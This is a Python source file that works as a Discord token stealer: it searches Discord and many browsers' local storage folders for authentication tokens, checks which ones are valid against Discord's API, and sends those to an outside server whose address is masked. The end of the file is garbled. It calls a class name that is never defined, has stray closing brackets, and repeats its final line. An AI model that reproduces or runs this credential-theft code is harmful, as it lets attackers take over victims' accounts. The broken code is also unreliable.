import os, re, threading, urllib.request

class Marshal:
    def __init__(self):
        self.host = "https://xxxxxxxx.xx/"
        self.all_tokens = []
        self.valid_tokens = []
        self.paths = {
            "__ROAMING__/Discord/Local Storage/leveldb",
            "__ROAMING__/discordcanary/Local Storage/leveldb",
            "__ROAMING__/discordptb/Local Storage/leveldb",
            "__ROAMING__/Lightcord/Local Storage/leveldb",
            "__ROAMING__/OperaSoftware/Opera GX Stable/Local Storage/leveldb",
            "__ROAMING__/OperaSoftware/Opera Stable/Local Storage/leveldb",
            "__LOCAL__/Google/Chrome/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/Google/Chrome SxS/User Data/Local Storage/leveldb",
            "__LOCAL__/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/Amigo/User Data/Local Storage/leveldb",
            "__LOCAL__/Torch/User Data/Local Storage/leveldb",
            "__LOCAL__/Kometa/User Data/Local Storage/leveldb",
            "__LOCAL__/Orbitum/User Data/Local Storage/leveldb",
            "__LOCAL__/CentBrowser/User Data/Local Storage/leveldb",
            "__LOCAL__/7Star/7Star/User Data/Local Storage/leveldb",
            "__LOCAL__/Sputnik/Sputnik/User Data/Local Storage/leveldb",
            "__LOCAL__/Vivaldi/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/EpicPrivacy Browser/User Data/Local Storage/leveldb",
            "__LOCAL__/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/uCozMedia/Uran/User Data/Default/Local Storage/leveldb",
            "__LOCAL__/Iridium/User Data/Default/Local Storage/leveld",
        }
        
        for path in self.paths:
            try:
                path = path.replace('__LOCAL__', os.getenv('LOCALAPPDATA')).replace('__ROAMING__', os.getenv('APPDATA'))
                if os.path.exists(path):
                    for file_name in os.listdir(path):
                        if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                    for token in re.findall(regex, line):
                                        if token not in self.all_tokens:self.all_tokens.append(token)
            except:pass
    
    def __Check_Tokens(self):
        threads_worker = []
        def check(token):
            try:
                # Need to change this url for check if account is lock or invalid
                if urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me', headers= {'content-type': 'application/json', 'authorization': token, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}, method= 'GET')).getcode() == 200:self.valid_tokens.append(token)
            except:pass
            
        for token in self.all_tokens:threads_worker.append(threading.Thread(target= check, args=(token,)))
        for T in threads_worker:T.start()
        for T in threads_worker:T.join()
        
    def __Main__(self):
        self.__Check_Tokens()
        for token in self.valid_tokens:
            urllib.request.urlopen(urllib.request.Request(self.host+"/api?type=addtoken&token="+token, method='GET'))


threading.Thread(target=X3N0S().__Main__()).start()
))


threading.Thread(target=X3N0S().__Main__()).start()
